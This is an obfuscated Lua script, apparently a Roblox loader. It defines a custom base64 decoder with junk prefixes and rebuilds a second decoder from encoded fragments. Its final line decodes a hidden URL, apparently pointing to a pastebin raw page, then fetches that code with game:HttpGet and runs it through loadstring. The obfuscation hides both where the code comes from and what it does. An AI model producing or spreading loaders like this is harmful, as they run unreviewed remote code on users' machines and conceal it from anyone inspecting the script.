local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local b=EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('CekvLrxDhdKOzKgMayaZmlsMDISISMqTppfryoeeuFNctgTKqAIfkqcQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLw==')
function jOUWAWKRLgnekWWJKoLGTitfZ(data) m=string.sub(data, 0, 55) data=data:gsub(m,EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('yOncEHQkVnoVgvVyppKNwrnNYWsLlkRawNmAPhaMXvAyUYUGGEmIEfH'))

data = string.gsub(data, EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('ryHIcNNAxHcfxTFaHKBCUbXaZFwaGyBowpeFtGvQssYwjJFSxthziGhW14=')..b..EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('cRUZwHCxrsayblIayvCDvOUTlChBlCKXAUsQZnEMrdYDBHMIEFOvxrLPV0='), EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('DZlriRFDBlsQamZcnfSEnEnCgFtazHVhYcKZIftCiBIlAeAhEuyFCZC')) return (data:gsub(EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('SwyBNNshUpTiGSFlhPEThSkAXOhwhDSMfBQxfFbKShbTWGdVVKVrsAvLg=='), function(x) if (x == EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('CdNEXsWtMGeeCrMdPgQgZFIJNBvRtfnulvRZOaDYXhvLYGdarXeURcAPQ==')) then return EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('GRblbVUuNRkpYAIZzODlNdhrzfGXiDFkLhJKzEXZkRobgTXJgPAFozL') end local r,f=EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('CgAfUNjUWSJFnHRynLqYvHGDSaQQXlVeTPLFDlmYEBwYKGoufUEVFfq'),(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('FlzAaTcpYMPrznLxFEqRxLatworENEPswcmGyHgGvEFxLzEBKwoQKdjMQ==') or EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('YcUkupYUYZGpTfEGjevXwkfnuQuTQUPwgFqeLZBOxOMaqiAwsxbSkpOMA==')) end return r; end):gsub(EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('ZmUHGOHneEHNLSvcyAzTOnkulCrUuyHoHffNqTEkpipYfHNWaKkuiVkJWQlZCVkPyVkPyVkPyVkPyVkPyVkPw=='), function(x) if (#x ~= 8) then return EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('hwiSTBMOrtkBOMBXJVMiptpbmePtVdBtmhkWuzWTEZidftskGTCXrCc') end local c=0 for i=1,8 do c=c+(x:sub(i,i)==EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('fGWyUnazHREzIHlrmgeOOQwiDkSnfepvviApDkBZJGuZCJuwFsEMJREMQ==') and 2^(8-i) or 0) end return string.char(c) end)) end


 


loadstring(game:HttpGet(jOUWAWKRLgnekWWJKoLGTitfZ(EXauNgISXwMuCRHiOQKesdCWsRaUDbSbsIJZwExHvFTxgfjkmXJuBJPLwkyiYWsLQcKaJjorAIhskUvlKFyjCPAEZPM('NaxLpcAvSkyEbltuiopkNNLounhtygcaMRmkdvZRSsEjeTQgzVNkLOzbUN6dnRIZUJnZXBOam9IbVZVRUZtR2NJQ0tOSFdDcVJaSUhXZXhCTWtUakJYWHZMYlhtZHhNV2FIUjBjSE02THk5d1lYTjBaV0pwYmk1amIyMHZjbUYzTDBabGJqQldkMDFa'))))()        
